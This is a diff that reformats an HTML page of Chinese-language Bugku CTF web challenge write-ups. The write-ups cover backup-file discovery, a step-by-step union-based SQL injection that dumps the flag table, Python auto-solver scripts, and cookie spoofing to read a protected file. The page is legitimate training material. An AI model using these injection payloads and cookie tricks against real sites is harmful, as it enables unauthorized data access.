@@ -326,9 +326,11 @@ hint：本地管理员<br />
 - flag{bugku-baopo-hah} </p>
 <h2 id="_10">备份是个好习惯</h2>
 <p>打开网址 得hex代码 转换成ASCII失败 应该不是hex<br />
-hint：备份<br />
-- 用py扫一下目录得到 http://123.206.87.240:8002/web16/index.php.bak<br />
-- 下载打开</p>
+hint：备份</p>
+<ul>
+<li>用py扫一下目录得到 http://123.206.87.240:8002/web16/index.php.bak</li>
+<li>下载打开</li>
+</ul>
 <div class="hlcode"><pre><span class="cp">&lt;?php</span>
 <span class="k">include_once</span> <span class="s2">&quot;flag.php&quot;</span><span class="p">;</span>
 <span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
@@ -364,90 +366,110 @@ hint：备份<br />
 <li>Bugku{OH_YOU_FIND_MY_MOMY}</li>
 </ul>
 <h2 id="_11">成绩单查询</h2>
-<p>标准sql注入题<br />
-- hackbar注入<code>id=1'#</code> 成功<br />
-- 判断列数<code>id=1' order by 4#</code>四列，五列测试不对<br />
-- 联合查询<code>id=0' union select 1,2,3,4#</code>z成功<br />
-- 查询<code>id=0' union select 1,database(),user(),version()#</code><br />
-- 看到数据库名称含有flag<br />
-<code>skctf_flag     skctf_flag@localhost    5.5.34-log</code><br />
-- 查询表名 <code>id=0' union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema='skctf_flag')#</code>得到表名fl4g<br />
-- 查询表的列名<code>id=0'union select 1,2,3,(select group_concat(column_name)
- from information_schema.columns where table_name='fl4g')#</code>得出列skctf_flag<br />
-- 查询数据<code>id=0' union select 1,2,3,(select skctf_flag from fl4g)#</code><br />
-- BUGKU{Sql_INJECT0N_4813drd8hz4}</p>
+<p>标准sql注入题</p>
+<ul>
+<li>hackbar注入<code>id=1'#</code> 成功</li>
+<li>判断列数<code>id=1' order by 4#</code>四列，五列测试不对</li>
+<li>联合查询<code>id=0' union select 1,2,3,4#</code>z成功</li>
+<li>查询<code>id=0' union select 1,database(),user(),version()#</code></li>
+<li>看到数据库名称含有flag<br />
+<code>skctf_flag     skctf_flag@localhost    5.5.34-log</code></li>
+<li>查询表名 <code>id=0' union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema='skctf_flag')#</code>得到表名fl4g</li>
+<li>查询表的列名<code>id=0'union select 1,2,3,(select group_concat(column_name)
+ from information_schema.columns where table_name='fl4g')#</code>得出列skctf_flag</li>
+<li>查询数据<code>id=0' union select 1,2,3,(select skctf_flag from fl4g)#</code></li>
+<li>BUGKU{Sql_INJECT0N_4813drd8hz4}</li>
+</ul>
 <h2 id="_12">秋名山老司机</h2>
 <p>题目：亲请在2s内计算老司机的车速是多少<br />
 1453188555<em>112050552</em>2035911046+129564843-990655641<em>10801555</em>1826101406-742934982+1688885834-387627083+502307721=?;<br />
-车速太快人不行了 借助py<br />
-- 看看前辈 https://www.jianshu.com/p/b0a5d72c8bae<br />
-<code>python
-  #改一下url
-  import requests
-  import re
-  url = 'http://120.24.86.145:8002/qiumingshan/'
-  s = requests.Session()
-  source = s.get(url)
-  expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()
-  result = eval(expression)
-  post = {'value': result}
-  print(s.post(url, data = post).text)</code><br />
-- 跑了好几次<br />
-- Bugku{YOU_DID_IT_BY_SECOND}</p>
+车速太快人不行了 借助py</p>
+<ul>
+<li>看看前辈 https://www.jianshu.com/p/b0a5d72c8bae</li>
+</ul>
+<div class="hlcode"><pre>  <span class="c">#改一下url</span>
+  <span class="kn">import</span> <span class="nn">requests</span>
+  <span class="kn">import</span> <span class="nn">re</span>
+  <span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://120.24.86.145:8002/qiumingshan/&#39;</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+  <span class="n">source</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+  <span class="n">expression</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d+[+\-*])+(\d+)&#39;</span><span class="p">,</span> <span class="n">source</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">()</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span>
+  <span class="n">post</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;value&#39;</span><span class="p">:</span> <span class="n">result</span><span class="p">}</span>
+  <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">post</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
+</pre></div>
+
+
+<ul>
+<li>跑了好几次</li>
+<li>Bugku{YOU_DID_IT_BY_SECOND}</li>
+</ul>
 <h2 id="_13">速度要快</h2>
 <p>打开网页：我感觉你得快点!!!<br />
 - 看源码有注释<br />
 - 抓包看一下raw中有base64 解码后验证不是flag<br />
 - 每一次go base64都不一样<br />
-- 写脚本<br />
-  ```python<br />
-  #coding:utf-8<br />
-  import requests<br />
-  import base64</p>
-<p>url='http://123.206.87.240:8002/web6/'<br />
-  s=requests.Session()<br />
-  header=s.get(url).headers<br />
-  #print(header)<br />
-  flag = base64.b64decode(base64.b64decode(header['flag']).decode() .split(':')[1]).decode() #对其进行base64两次解密</p>
-<p>data={'margin':flag}</p>
-<p>print(s.post(url=url,data=data).content.decode())<br />
-  ```<br />
-- KEY{111dd62fcd377076be18a}</p>
+- 写脚本</p>
+<div class="hlcode"><pre>  <span class="c">#coding:utf-8</span>
+  <span class="kn">import</span> <span class="nn">requests</span>
+  <span class="kn">import</span> <span class="nn">base64</span>
+
+  <span class="n">url</span><span class="o">=</span><span class="s">&#39;http://123.206.87.240:8002/web6/&#39;</span>
+  <span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+  <span class="n">header</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">headers</span>
+  <span class="c">#print(header)</span>
+  <span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">header</span><span class="p">[</span><span class="s">&#39;flag&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="c">#对其进行base64两次解密</span>
+
+  <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">&#39;margin&#39;</span><span class="p">:</span><span class="n">flag</span><span class="p">}</span>
+
+  <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</pre></div>
+
+
+<ul>
+<li>KEY{111dd62fcd377076be18a}</li>
+</ul>
 <h2 id="cookies">cookies欺骗</h2>
 <p>打开网址 url=http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=<br />
 - 好像有base64 解码得<code>keys.txt</code><br />
 - 尝试用filename访问index.php（原url使用base64，这也将index.php进行编码<code>aW5kZXgucGhw</code><br />
 - 构造 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw<br />
-- 显示信息切换行数都有 写脚本获取全部代码<br />
-<code>python 
-  import requests
-  a=30
-  for i in range(a):
-      url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" 
-      s=requests.get(url)
-      print s.text</code><br />
-得到源代码<br />
-<code>php
-  &lt;?php
-  error_reporting(0);
-  $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
-  $line=isset($_GET['line'])?intval($_GET['line']):0;
-  if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");
-  $file_list = array(
-  '0' =&gt;'keys.txt',
-  '1' =&gt;'index.php',
-  );
-  if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){
-  $file_list[2]='keys.php';
-  }
-  if(in_array($file, $file_list)){
-  $fa = file($file);
-  echo $fa[$line];
-  }
-  ?&gt;</code><br />
-- 阅读得知cookie margin=margin<br />
-- 抓包raw加上Cookie: margin=margin 修改filename=a2V5cy5waHA=  然后go<br />
-- KEY{key_keys}</p>
+- 显示信息切换行数都有 写脚本获取全部代码</p>
+<div class="hlcode"><pre>  <span class="kn">import</span> <span class="nn">requests</span>
+  <span class="n">a</span><span class="o">=</span><span class="mi">30</span>
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+      <span class="n">url</span><span class="o">=</span><span class="s">&quot;http://123.206.87.240:8002/web11/index.php?line=&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;&amp;filename=aW5kZXgucGhw&quot;</span> 
+      <span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+      <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">text</span>
+</pre></div>
+
+
+<p>得到源代码</p>
+<div class="hlcode"><pre><span class="x">  </span><span class="cp">&lt;?php</span>
+  <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="nv">$file</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+  <span class="nv">$line</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;line&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;line&#39;</span><span class="p">])</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span><span class="p">);</span>
+  <span class="nv">$file_list</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+  <span class="s1">&#39;0&#39;</span> <span class="o">=&gt;</span><span class="s1">&#39;keys.txt&#39;</span><span class="p">,</span>
+  <span class="s1">&#39;1&#39;</span> <span class="o">=&gt;</span><span class="s1">&#39;index.php&#39;</span><span class="p">,</span>
+  <span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;margin&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;margin&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;margin&#39;</span><span class="p">){</span>
+  <span class="nv">$file_list</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;keys.php&#39;</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$file_list</span><span class="p">)){</span>
+  <span class="nv">$fa</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="nv">$fa</span><span class="p">[</span><span class="nv">$line</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<ul>
+<li>阅读得知cookie margin=margin</li>
+<li>抓包raw加上Cookie: margin=margin 修改filename=a2V5cy5waHA=  然后go</li>
+<li>KEY{key_keys}</li>
+</ul>
 <h2 id="never-give-up">never give up</h2>
 <p>url=http://123.206.87.240:8006/test/hello.php<br />
 显示：never never never give up !!! <br />
